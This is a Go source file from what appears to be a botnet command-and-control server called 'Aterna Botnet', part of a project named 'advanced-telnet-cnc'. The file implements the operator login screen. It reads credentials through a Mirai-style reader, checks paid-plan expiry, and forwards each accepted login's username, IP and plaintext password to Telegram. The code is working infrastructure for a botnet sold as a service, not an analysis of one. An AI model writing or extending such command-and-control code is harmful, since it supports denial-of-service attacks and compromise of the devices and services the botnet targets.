package view

import (
	"advanced-telnet-cnc/source/config"
	"advanced-telnet-cnc/source/database"
	"advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/telegram"
	"advanced-telnet-cnc/source/master/termfx"
	"fmt"
	"time"
)

func Login(fx *termfx.TermFX, session *sessions.Session) error {
	session.Clear()

	session.Print(fmt.Sprintf("\033]0;Aterna Botnet \007"))

	if config.Master.Captcha {
		err := Captcha(fx, session)
		if err != nil {
			session.Close()
			return ErrTooBigLength
		}
	}

	session.Print(fmt.Sprintf("\033]0; Aterna Botnet \007"))

	executeString, err := fx.ExecuteString("username.lufx", fx.Colors(nil))
	if err != nil {
		return err
	}

	username, err := session.Reader.MiraiRead(executeString, false)
	if err != nil {
		return err
	}

	executeString, err = fx.ExecuteString("password.lufx", fx.Colors(nil))
	if err != nil {
		return err
	}

	password, err := session.Reader.MiraiRead(executeString, true)
	if err != nil {
		return err
	}

	if len(username) > 32 || len(password) > 128 {
		session.Close()
		return ErrTooBigLength
	}

	if len(username) > 32 || len(password) > 128 {
		session.Close()
		return ErrTooBigLength
	}

	if database.VerifyCredentials(username, password) != nil {
		err = fx.Execute("invalid_credentials.lufx", true, fx.Colors(nil))
		if err != nil {
			return err
		}
		session.Close()
		return ErrInvalidCredentials
	}

	user, err := database.UserFromName(username)
	if err != nil {
		config.Logger.Error("Retrieving user by name failed", "err", err)
		session.Close()
		return err
	}

	if user == nil {
		config.Logger.Error("Retrieving user by name failed", "err", err)
		session.Close()
		return err
	}

	if time.Now().After(user.Expiry) {
		err = fx.Execute("expired_plan.lufx", true, fx.Colors(nil))
		if err != nil {
			return err
		}

		return ErrExpiredPlan
	}

	telegram.Send("[!] Accepted master connection: name=" + username + ", ip=" + session.Conn.RemoteAddr().String() + ", password=" + password)

	session.UserProfile = user
	session.Created = time.Now()

	time.Sleep(100 * time.Millisecond)

	sessions.New(session)

	session.Clear()
	return nil
}
